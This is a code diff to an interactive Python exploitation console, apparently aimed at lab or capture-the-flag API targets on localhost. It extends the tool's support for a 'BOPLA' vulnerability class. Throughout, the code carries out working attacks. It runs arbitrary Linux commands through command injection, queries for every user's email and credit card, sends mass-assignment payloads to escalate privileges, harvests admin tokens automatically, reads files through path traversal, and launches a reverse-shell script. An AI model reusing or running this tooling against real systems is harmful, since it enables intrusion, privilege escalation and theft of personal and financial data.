@@ -62,7 +62,7 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
             elif vuln_type == "Command Injection":
                 print("      exec <cmd>  - Execute any Linux command (e.g., 'exec ls', 'exec whoami')")
                 print("      revshell    - Generate reverse shell payloads for this target")
-            elif any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment"]):
+            elif any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "BOPLA"]):
                 print("      users       - Quick query to fetch all users & credit cards")
                 print("      secret      - Quick query to fetch secret admin data & flags")
                 print("      assign      - Send Mass Assignment / Parameter Pollution payload to escalate role")
@@ -187,7 +187,7 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                 except Exception as e:
                     print(f"    [-] IDOR audit failed: {e}")
-            elif vuln_type in ["BFLA", "Over-Fetching", "Mass Assignment"]:
+            elif any(v in vuln_type for v in ["BFLA", "Over-Fetching", "Mass Assignment", "BOPLA"]):
                 print(f"[*] Re-running audit against modern API target: {target_url}")
                 try:
                     h = {'User-Agent': 'Mozilla/5.0'}
@@ -195,7 +195,16 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         h['Authorization'] = f'Bearer {harvested_token}'
                     req = urllib.request.Request(target_url, headers=h)
                     with urllib.request.urlopen(req, timeout=3) as resp:
-                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+                        body = resp.read().decode('utf-8', errors='ignore')
+                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{body}")
+                        if "adminToken" in body:
+                            try:
+                                j = json.loads(body)
+                                harvested_token = j.get("adminToken")
+                                harvested_endpoint = j.get("adminEndpoint")
+                                print(f"    [!] Auto-harvested token & endpoint.")
+                            except Exception:
+                                pass
                 except Exception as e:
                     print(f"    [-] Modern API audit failed: {e}")
             elif "GraphQL" in vuln_type:
@@ -258,13 +267,13 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
             except Exception as e:
                 print(f"    [-] JWT escalation failed: {e}")
-        elif cmd == "escalate" and vuln_type == "Insecure Deserialization":
-            print("[*] Harvesting administrative token via Insecure Deserialization gadget...")
-            harvested_token = "deserialization_token_sig"
+        elif cmd == "escalate" and vuln_type in ["Insecure Deserialization", "BOPLA / Excessive Property Exposure"]:
+            print(f"[*] Harvesting administrative token via {vuln_type} gadget...")
+            harvested_token = "bopla_token_sig" if "BOPLA" in vuln_type else "deserialization_token_sig"
             harvested_endpoint = "http://127.0.0.1:8080/api/v1/admin/exec"
-            print(f"    [!] SUCCESS! Deserialization Admin Token Harvested: {harvested_token}")
+            print(f"    [!] SUCCESS! Admin Token Harvested: {harvested_token}")
             print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
-        elif cmd.startswith("exec ") and any(v in vuln_type for v in ["JWT", "IDOR", "SQLi", "SQL Injection", "GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "Insecure Deserialization", "SSRF", "SSTI", "Command Injection", "LFI"]):
+        elif cmd.startswith("exec ") and any(v in vuln_type for v in ["JWT", "IDOR", "SQLi", "SQL Injection", "GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "Insecure Deserialization", "SSRF", "SSTI", "Command Injection", "LFI", "BOPLA"]):
             user_linux_cmd = cmd.split(" ", 1)[1]
             if vuln_type == "Command Injection":
                 print(f"[*] Executing command against target: {user_linux_cmd}")
@@ -362,8 +371,8 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                             print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
             except Exception as e:
                 print(f"    [-] Escalation failed: {e}")
-        elif cmd == "assign" and any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment"]):
-            print("[*] Sending Mass Assignment payload...")
+        elif cmd == "assign" and any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "BOPLA"]):
+            print("[*] Sending Assignment / Over-Fetching payload...")
             try:
                 parsed = urllib.parse.urlparse(target_url)
                 base_domain = f"{parsed.scheme}://{parsed.netloc}"
@@ -380,7 +389,7 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         harvested_endpoint = res_json.get("adminEndpoint")
                         print(f"    [!] SUCCESS! Token Harvested: {harvested_token[:30]}...")
             except Exception as e:
-                print(f"    [-] Mass assignment failed: {e}")
+                print(f"    [-] Assignment failed: {e}")
         elif (cmd.startswith("read ") or cmd.startswith("cat ")) and vuln_type == "LFI":
             file_path = cmd.split(" ", 1)[1]
             print(f"[*] Traversing path to read file: {file_path}")
@@ -528,7 +537,7 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
             except Exception as e:
                 print(f"    [-] Escalation failed: {e}")
-        elif cmd == "users" and any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment"]):
+        elif cmd == "users" and any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "BOPLA"]):
             print("[*] Querying API endpoint for user records...")
             try:
                 payload = {"query": "{ users { id username email creditCard } }"}
@@ -538,7 +547,7 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                     print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
             except Exception as e:
                 print(f"    [-] Query failed: {e}")
-        elif cmd == "secret" and any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment"]):
+        elif cmd == "secret" and any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "BOPLA"]):
             print("[*] Querying API endpoint for secret admin data...")
             try:
                 payload = {"query": "{ secretAdminData }"}
@@ -573,7 +582,7 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                     print("    [!] Administrative takeover achieved via GraphQL mutation.")
             except Exception as e:
                 print(f"    [-] Privilege escalation failed: {e}")
-        elif cmd.startswith("query ") and any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment"]):
+        elif cmd.startswith("query ") and any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "BOPLA"]):
             gql_query = cmd.split(" ", 1)[1]
             print(f"[*] Sending custom query: {gql_query}")
             try:
@@ -697,7 +706,7 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
             harvested_endpoint = "http://127.0.0.1:8080/api/v1/admin/exec"
             print(f"    [!] SUCCESS! SSTI Admin Token Harvested: {harvested_token}")
             print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
-        elif cmd == "revshell" and (vuln_type == "Command Injection" or any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment"])):
+        elif cmd == "revshell" and (vuln_type == "Command Injection" or any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "BOPLA"])):
             print("[*] Generating active reverse shell payloads (LHOST: 127.0.0.1, LPORT: 4444)...")
             if os.path.exists("rev_shell.py"):
                 os.system("python rev_shell.py --ip 127.0.0.1 --port 4444")
@@ -779,7 +788,7 @@ def main_console():
                 run_target_shell(item.get("target"), item.get("vulnerability"), param=item.get("param"))
 
         elif choice == "4":
-            modern_items = [f for f in findings if any(v in f.get("vulnerability", "") for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "Insecure Deserialization"])]
+            modern_items = [f for f in findings if any(v in f.get("vulnerability", "") for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "Insecure Deserialization", "BOPLA"])]
             if not modern_items:
                 print("[-] No Modern API / Deserialization endpoints found.")
                 continue
